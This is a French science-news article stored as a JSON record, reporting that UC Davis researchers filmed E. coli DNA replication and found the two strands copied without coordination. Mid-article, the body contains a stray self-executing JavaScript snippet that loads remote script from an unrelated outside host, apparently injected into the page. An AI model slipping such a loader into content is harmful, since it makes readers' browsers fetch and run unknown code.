{"title": "La replication de l'ADN en video : une grande premiere !", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-06-21", "content": "Des chercheurs de l'universite de Californie ont filme l'ADN de la bacterie  Escherichia coli  en train de se repliquer. A cette occasion, ils ont observe quelques surprises... Il s'agit d'une decouverte majeure sur cette etape fondamentale de la vie cellulaire. Ce qu'il faut retenir Des chercheurs ont filme un ADN bacterien en cours de replication. Les deux brins d'ADN semblent se repliquer independamment l'un de l'autre, sans coordination. Ceci remet en cause certaines conceptions dans le processus de replication de l'ADN. L' ADN  qui constitue notre materiel  genetique  se presente sous la forme d'une double helice qui comprend deux brins. Chacun d'entre eux est compose d'une succession de bases, les << lettres >> de l'ADN qui ne sont qu'au nombre de quatre : la  guanine , l' adenine , la  thymine , la  cytosine  (G, A, T et C). Dans l'ADN double brin, chaque brin est complementaire de l'autre, la base G s'associant a C et A a T. La replication consiste a fabriquer deux  molecules  d'ADN identiques a la molecule mere, et permettre ainsi sa  conservation .  La  replication  peut commencer quand une  enzyme  appelee  helicase  (Dna B chez  E. coli ) deroule la  double helice . Puis une autre enzyme, une primase, attache une amorce (\"primer\") a chaque brin. Une troisieme, un ADN  polymerase , se lie a l'amorce et ajoute de nouvelles bases. Le saviez-vous ? In vivo , l'ADN d' E. coli  se replique a la vitesse de 650 paires de bases par seconde. Il existe des differences entre les ADN bacteriens et humains mais le processus de replication est proche. Mais la synthese d' ADN  a lieu differemment sur les deux brins. En effet, chaque brin a une extremite appelee 5' et une autre 3' et les deux sont disposes de maniere opposee. Or le nouveau brin croit de 5' en 3'. Pour l'un des deux, le brin << leader >>, la copie se fait directement en progressant de 5' en 3' sur le nouveau. Mais pour l'autre, des petits fragments de 1 a 3  kilobases  (kb), appeles fragments d'Okasaki, sont necessaires pour la copie de l'ADN. Ces petits fragments sont ensuite associes entre eux. C'est pourquoi la synthese d'ADN est souvent qualifiee de semi-discontinue.  Quoi qu'il en soit, le nouveau brin genetique fabrique pendant la replication est complementaire de l'original, ce qui permet une replication fidele de l'ADN.  Le processus de replication a ete filme dans cette video. (c)  UC Davis ,  via  Andy Fell, YouTube Pas de coordination dans la synthese des deux brins d'ADN Pendant longtemps on a considere que les ADN polymerases qui agissent sur le brin leader et sur l'autre se coordonnent pour eviter que l'une des deux avance plus vite que l'autre. Sinon, de longs fragments d'ADN simple brin pourraient destabiliser le  genome . Mais la video qu'ont realisee les chercheurs de l' universite de Californie Davis  revele que chaque brin semble fabrique independamment.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Pour obtenir ce petit film, l'equipe a extrait des molecules d'ADN de la  bacterie   E. coli . Ils ont ensuite applique un detergent fluorescent qui se lie a la double helice mais pas a un brin seul, ce qui permet de visualiser la progression d'une double helice. Les chercheurs ont trouve qu'en moyenne la  vitesse  a laquelle les deux brins se repliquent etait la meme. Mais au cours du processus, il y avait des arrets et des redemarrages : les deux  brins  semblaient fonctionner comme deux entites independantes avec leur propre planning de synthese. \" C'est une maniere differente de penser la replication qui pose de nouvelles questions. Par exemple, il pouvait arriver que le brin leader continuait sa synthese tandis que l'autre etait en arret. Parfois l'un d'eux se repliquait dix fois plus vite que sa vitesse habituelle, sans raison apparente.  << C'est une maniere differente de penser la replication qui pose de nouvelles questions , a declare dans un communique Stephen Kowalczykowski, un des auteurs de cette recherche parue dans  Cell .  C'est un veritable changement de paradigme,  a-t-il ajoute.  Nous avons montre qu'il n'y avait pas de coordination entre les brins. Ils sont completement autonomes. >> Interview 1/5 : les secrets de l'ADN                       L'ADN est porteuse de l'information genetique. Chaque cellule possede un noyau constitue de chromosomes contenant de l'ADN. Nous avons interviewe Jean-Louis Serre, professeur de genetique, pour qu'il nous parle plus en detail de cette molecule contenue dans tout organisme vivant.                                       ", "theme": "sante"}